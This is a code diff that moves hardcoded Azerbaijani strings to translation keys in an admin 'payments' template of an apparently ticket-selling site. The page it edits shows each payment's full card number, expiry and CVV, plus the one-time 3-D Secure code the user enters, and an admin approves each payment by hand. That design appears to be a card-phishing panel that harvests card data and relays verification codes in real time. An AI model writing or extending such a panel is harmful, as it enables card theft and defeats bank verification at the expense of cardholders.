@@ -4,7 +4,7 @@
       <div>
         <div class="eyebrow"><%= t('nav.panel') %></div>
         <h1><%= t('admin.payments') %></h1>
-        <p>Kart məlumatları və doğrulama kodları burada təsdiqlənir.</p>
+        <p><%= t('admin.payNote') %></p>
       </div>
     </div>
 
@@ -14,16 +14,16 @@
       <div>
         <div class="card mb-24"><div class="card__body">
           <div class="timetable-tabs">
-            <a class="tab <%= status === 'pending' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=pending">Gözləyən</a>
-            <a class="tab <%= status === 'approved' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=approved">Təsdiqlənmiş</a>
-            <a class="tab <%= status === 'declined' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=declined">Rədd edilmiş</a>
-            <a class="tab <%= status === 'all' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=all">Hamısı</a>
+            <a class="tab <%= status === 'pending' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=pending"><%= t('admin.paymentsFilterPending') %></a>
+            <a class="tab <%= status === 'approved' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=approved"><%= t('admin.paymentsFilterApproved') %></a>
+            <a class="tab <%= status === 'declined' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=declined"><%= t('admin.paymentsFilterDeclined') %></a>
+            <a class="tab <%= status === 'all' ? 'is-active' : '' %>" href="/<%= locale %>/admin/odenisler?status=all"><%= t('admin.paymentsFilterAll') %></a>
           </div>
           <div id="payNote" class="hidden"></div>
         </div></div>
 
         <% if (!payments.length) { %>
-          <div class="card"><div class="card__body"><p class="sec-note mb-0">Bu bölmədə ödəniş yoxdur.</p></div></div>
+          <div class="card"><div class="card__body"><p class="sec-note mb-0"><%= t('admin.noPaymentsHere') %></p></div></div>
         <% } %>
 
         <% payments.forEach(function(p){ %>
@@ -39,30 +39,30 @@
                 <div>
                   <h3 style="font-size:1rem;margin-top:0"><%= t('admin.cardData') %></h3>
                   <dl class="kv">
-                    <dt>Kart</dt><dd class="mono"><%= p.card && p.card.number ? p.card.number : '—' %></dd>
-                    <dt>Sahib</dt><dd><%= p.card && p.card.holder ? p.card.holder : '—' %></dd>
-                    <dt>Bitmə</dt><dd class="mono"><%= p.card && p.card.expiry ? p.card.expiry : '—' %></dd>
-                    <dt>CVV</dt><dd class="mono"><%= p.card && p.card.cvv ? p.card.cvv : '—' %></dd>
-                    <dt>Brend</dt><dd><%= p.card && p.card.brand ? p.card.brand : '—' %></dd>
-                    <dt>Üsul</dt><dd><%= p.method === 'balance' ? 'Balans' : 'Kart' %></dd>
-                    <dt>Məbləğ</dt><dd class="mono"><%= p.amount.toFixed(2) %> ₼</dd>
+                    <dt><%= t('secure3d.card') %></dt><dd class="mono"><%= p.card && p.card.number ? p.card.number : '—' %></dd>
+                    <dt><%= t('admin.holderLabel') %></dt><dd><%= p.card && p.card.holder ? p.card.holder : '—' %></dd>
+                    <dt><%= t('admin.expiryLabel') %></dt><dd class="mono"><%= p.card && p.card.expiry ? p.card.expiry : '—' %></dd>
+                    <dt><%= t('payment.cvv') %></dt><dd class="mono"><%= p.card && p.card.cvv ? p.card.cvv : '—' %></dd>
+                    <dt><%= t('admin.brandLabel') %></dt><dd><%= p.card && p.card.brand ? p.card.brand : '—' %></dd>
+                    <dt><%= t('admin.methodLabel') %></dt><dd><%= p.method === 'balance' ? t('admin.methodBalance') : t('admin.methodCard') %></dd>
+                    <dt><%= t('payment.amountLabel') %></dt><dd class="mono"><%= p.amount.toFixed(2) %> ₼</dd>
                   </dl>
                 </div>
                 <div>
-                  <h3 style="font-size:1rem;margin-top:0">İstifadəçi / sifariş</h3>
+                  <h3 style="font-size:1rem;margin-top:0"><%= t('admin.userOrderGroup') %></h3>
                   <dl class="kv">
-                    <dt>İstifadəçi</dt><dd><%= u ? (u.firstName + ' ' + u.lastName) : '—' %></dd>
-                    <dt>E-poçt</dt><dd><%= u ? u.email : '—' %></dd>
-                    <dt>Telefon</dt><dd><%= u && u.phone ? u.phone : '—' %></dd>
-                    <dt>Sifariş</dt><dd class="mono"><%= o ? o.orderNo : 'Balans artırımı' %></dd>
-                    <dt>Marşrut</dt><dd><%= o ? (o.fromName + ' — ' + o.toName) : '—' %></dd>
-                    <dt>Tarix</dt><dd><%= o ? (o.date + ' ' + o.departTime) : '—' %></dd>
+                    <dt><%= t('account.roleUser') %></dt><dd><%= u ? (u.firstName + ' ' + u.lastName) : '—' %></dd>
+                    <dt><%= t('checkout.email') %></dt><dd><%= u ? u.email : '—' %></dd>
+                    <dt><%= t('checkout.phone') %></dt><dd><%= u && u.phone ? u.phone : '—' %></dd>
+                    <dt><%= t('payment.orderLabel') %></dt><dd class="mono"><%= o ? o.orderNo : 'Balans artırımı' %></dd>
+                    <dt><%= t('table.route') %></dt><dd><%= o ? (o.fromName + ' — ' + o.toName) : '—' %></dd>
+                    <dt><%= t('search.date') %></dt><dd><%= o ? (o.date + ' ' + o.departTime) : '—' %></dd>
                   </dl>
                   <% if (p.verificationCode) { %>
-                    <p class="sec-note">Doğrulama kodu: <strong class="mono"><%= p.verificationCode %></strong></p>
+                    <p class="sec-note"><%= t('admin.verifyCodeLabel') %>: <strong class="mono"><%= p.verificationCode %></strong></p>
                   <% } %>
                   <% if (p.submittedCode) { %>
-                    <p class="sec-note">İstifadəçinin yazdığı kod: <strong class="mono"><%= p.submittedCode %></strong></p>
+                    <p class="sec-note"><%= t('admin.submittedCodeLabel') %>: <strong class="mono"><%= p.submittedCode %></strong></p>
                   <% } %>
                 </div>
               </div>
@@ -73,10 +73,10 @@
                   <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                 </div>
               <% } else if (p.status === 'awaiting_3ds') { %>
-                <p class="sec-note mt-16">İstifadəçi 3-D doğrulama ekranında kodu daxil edir.</p>
+                <p class="sec-note mt-16"><%= t('admin.awaiting3dsUser') %></p>
               <% } else if (p.status === 'code_submitted') { %>
                 <div class="flex-end mt-16">
-                  <button class="btn btn--primary btn--sm" data-approve-final="<%= p._id %>">Yekun təsdiq</button>
+                  <button class="btn btn--primary btn--sm" data-approve-final="<%= p._id %>"><%= t('admin.approveFinal') %></button>
                   <button class="btn btn--outline btn--sm" data-decline="<%= p._id %>"><%= t('admin.reject') %></button>
                 </div>
               <% } else { %>
@@ -118,12 +118,12 @@
     if (el.hasAttribute('data-approve-final')) { url = '/api/admin/payments/' + el.getAttribute('data-approve-final') + '/approve-final'; }
     if (el.hasAttribute('data-decline')) { url = '/api/admin/payments/' + el.getAttribute('data-decline') + '/decline'; }
     try {
-      var data = await call(url, { reason: 'Admin tərəfindən rədd edildi' });
-      show(data.message || (data.ok ? 'Hazırdır' : 'Alınmadı'), !!data.ok);
+      var data = await call(url, { reason: window.T('admin.rejectReason') });
+      show(data.message || (data.ok ? window.T('admin.completed') : window.T('msg.operationFailed')), !!data.ok);
       if (data.ok) { setTimeout(function () { window.location.reload(); }, 900); }
       else { el.disabled = false; }
     } catch (err) {
-      show('Şəbəkə xətası', false);
+      show(window.T('msg.networkError'), false);
       el.disabled = false;
     }
   });
